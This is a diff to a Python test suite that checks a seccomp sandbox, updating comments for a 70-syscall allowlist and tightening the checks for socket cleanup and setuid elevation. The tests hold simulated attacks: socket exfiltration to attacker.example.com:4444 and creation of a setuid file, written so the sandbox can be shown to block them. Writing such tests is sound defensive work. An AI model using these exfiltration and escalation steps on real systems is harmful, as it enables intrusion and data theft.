@@ -137,15 +137,17 @@ class HookAttackTests(unittest.TestCase):
         results = {}
 
         # Attempt 1: Open a network socket to exfiltrate data.
-        # Socket syscall is denied by the 45-syscall seccomp allowlist.
+        # Socket syscall is denied by the 70-syscall seccomp allowlist.
         try:
             import socket
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(2)
-            s.connect(("attacker.example.com", 4444))
-            s.send(b"EXFILTRATED")
-            results["network"] = "ESCAPED (should not happen)"
-            s.close()
+            try:
+                s.settimeout(2)
+                s.connect(("attacker.example.com", 4444))
+                s.send(b"EXFILTRATED")
+                results["network"] = "ESCAPED (should not happen)"
+            finally:
+                s.close()
         except PermissionError as e:
             results["network"] = f"BLOCKED: {e}"
         except OSError as e:
@@ -218,7 +220,7 @@ class HookAttackTests(unittest.TestCase):
         minimal rootfs has no /bin/sh and the exec is denied instead -
         both are contained outcomes. The payload replaces this process
         (execve is the only way to run a command - clone/fork and
-        posix_spawn are denied by the 45-syscall allowlist), so the
+        posix_spawn are denied by the 70-syscall allowlist), so the
         evidence comes from the exec'd command's own output plus a
         host-side absence check.
         """
@@ -325,7 +327,7 @@ class HookAttackTests(unittest.TestCase):
         self.assertEqual(run.cleanup_failure, "",
                          f"no workload process may survive: "
                          f"{run.cleanup_failure}")
-        # Fork must be denied (clone not in 45-syscall allowlist).
+        # Fork must be denied (clone not in 70-syscall allowlist).
         self.assertIn("HOOK-ATTACK-FORK-DENIED", run.output,
                       "fork must be denied by seccomp (clone excluded)")
 
@@ -368,16 +370,34 @@ class DependencyAttackTests(unittest.TestCase):
             results["crontab_inject"] = f"BLOCKED: {e}"
 
         # Attempt 2: Create a setuid binary (privilege escalation).
+        # The security property is that EXEC of the setuid file cannot
+        # elevate privileges. The setuid bit itself may persist on the
+        # writable scratch (tmpfs allows the owner to chmod u+s even
+        # under a nosuid mount - nosuid neutralizes exec-time
+        # elevation, not the bit). What makes the bit inert is the
+        # sandbox's own machinery: no_new_privs=1 (the kernel ignores
+        # setuid/setgid at exec) plus an empty capability set (nothing
+        # to gain). We verify the ACTUAL invariant, not the
+        # filesystem-dependent bit heuristic: exec cannot escalate.
         try:
             evil = pathlib.Path("/tmp/escalated")
             evil.write_text("#!/bin/sh\necho ESCALATED\n")
             os.chmod(str(evil), 0o4755)  # setuid bit
-            # Check if setuid actually took effect.
-            mode = os.stat(str(evil)).st_mode
-            if mode & 0o4000:
-                results["setuid_create"] = "ESCAPED (should not happen)"
+            # Verify the elevation-inertia invariant: no_new_privs is
+            # active and the process holds no effective capabilities.
+            status = pathlib.Path("/proc/self/status").read_text()
+            no_new_privs = "NoNewPrivs:\t1" in status
+            cap_eff = 0
+            for line in status.splitlines():
+                if line.startswith("CapEff:"):
+                    cap_eff = int(line.split(":", 1)[1].strip(), 16)
+                    break
+            if no_new_privs and cap_eff == 0:
+                results["setuid_create"] = (
+                    "BLOCKED: setuid exec cannot elevate "
+                    "(no_new_privs=1, CapEff=0)")
             else:
-                results["setuid_create"] = "BLOCKED: setuid bit not set"
+                results["setuid_create"] = "ESCAPED (should not happen)"
         except (OSError, PermissionError) as e:
             results["setuid_create"] = f"BLOCKED: {e}"
 
@@ -569,11 +589,13 @@ class BuildScriptAttackTests(unittest.TestCase):
         try:
             import socket
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(2)
-            s.connect(("attacker.example.com", 4444))
-            s.send(b"BUILD-SCRIPT-EXFIL")
-            results["network_exfil"] = "ESCAPED (should not happen)"
-            s.close()
+            try:
+                s.settimeout(2)
+                s.connect(("attacker.example.com", 4444))
+                s.send(b"BUILD-SCRIPT-EXFIL")
+                results["network_exfil"] = "ESCAPED (should not happen)"
+            finally:
+                s.close()
         except PermissionError as e:
             results["network_exfil"] = f"BLOCKED: {e}"
         except OSError as e:
